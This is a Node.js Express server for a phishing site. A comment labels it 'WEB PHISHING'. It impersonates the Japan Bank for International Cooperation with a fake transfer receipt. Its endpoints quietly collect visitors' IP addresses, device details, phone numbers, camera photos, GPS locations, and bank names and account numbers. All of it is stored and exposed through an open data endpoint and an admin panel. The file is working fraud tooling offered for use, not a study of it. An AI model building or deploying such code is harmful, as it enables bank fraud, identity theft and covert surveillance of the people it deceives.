const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname)));

const dataFile = path.join(__dirname, '.data', 'data.json');
const configFile = path.join(__dirname, '.data', 'config.json');

let dataStore = { sessions: [], photos: [], locations: [], forms: [] };

let webConfig = {
    header_text: 'Japan Bank for International Cooperation',
    logo_text: 'JBIC',
    logo_sub: '国際協力銀行',
    logo_small: 'JAPAN BANK FOR INTERNATIONAL COOPERATION',
    title_line1: 'JBIC JAPAN BANK',
    title_line2: 'INTERNATIONAL CORPORATION',
    subtitle: 'Office Purchasing',
    amount_idr: 'IDR 530.000',
    amount_foreign: 'YEN 4.733',
    transaction_type: 'International Transfer',
    currency: 'IDR / JPY',
    reference: 'DEMO-530000',
    status: 'SAMPLE',
    sender_bank: 'Japan Bank for International Cooperation',
    sender_name: 'JBIC',
    sender_account: 'JBIC-001',
    receiver_bank: 'Japan Bank for International Cooperation',
    receiver_name: 'Office Purchasing',
    receiver_account: 'JBIC-002'
};

try {
    fs.mkdirSync(path.join(__dirname, '.data'), { recursive: true });
    if (fs.existsSync(dataFile)) dataStore = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
    if (fs.existsSync(configFile)) webConfig = { ...webConfig, ...JSON.parse(fs.readFileSync(configFile, 'utf8')) };
} catch(e) {}

function saveData() {
    try { fs.writeFileSync(dataFile, JSON.stringify(dataStore)); } catch(e) {}
}

function saveConfig() {
    try { fs.writeFileSync(configFile, JSON.stringify(webConfig)); } catch(e) {}
}

// ===== API DATA COLLECTION =====
app.post('/api/session', (req, res) => {
    const { session_id, ip_address, network_name, device_name, battery, phone_number } = req.body;
    dataStore.sessions.push({ session_id, ip_address, network_name, device_name, battery, phone_number, time: new Date().toLocaleString('id-ID') });
    saveData();
    res.json({ success: true });
});

app.post('/api/photo', (req, res) => {
    const { session_id, photo_data, photo_count } = req.body;
    if (!photo_data) return res.status(400).json({ success: false });
    dataStore.photos.push({ session_id, photo_data, photo_count, time: new Date().toLocaleString('id-ID') });
    saveData();
    res.json({ success: true });
});

app.post('/api/location', (req, res) => {
    const { session_id, latitude, longitude, accuracy } = req.body;
    dataStore.locations.push({ session_id, latitude, longitude, accuracy, time: new Date().toLocaleString('id-ID') });
    saveData();
    res.json({ success: true });
});

app.post('/api/submit', (req, res) => {
    const { session_id, nama, phone, email, bank, rekening } = req.body;
    dataStore.forms.push({ session_id, nama, phone, email, bank, rekening, time: new Date().toLocaleString('id-ID') });
    saveData();
    res.json({ success: true });
});

// ===== API CONFIG =====
app.get('/api/config', (req, res) => {
    res.json({ success: true, config: webConfig });
});

app.post('/api/config', (req, res) => {
    webConfig = { ...webConfig, ...req.body };
    saveConfig();
    res.json({ success: true, config: webConfig });
});

// ===== API GET DATA =====
app.get('/api/data', (req, res) => {
    res.json({ success: true, data: dataStore });
});

// ===== WEB PHISHING =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ===== ADMIN PANEL =====
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
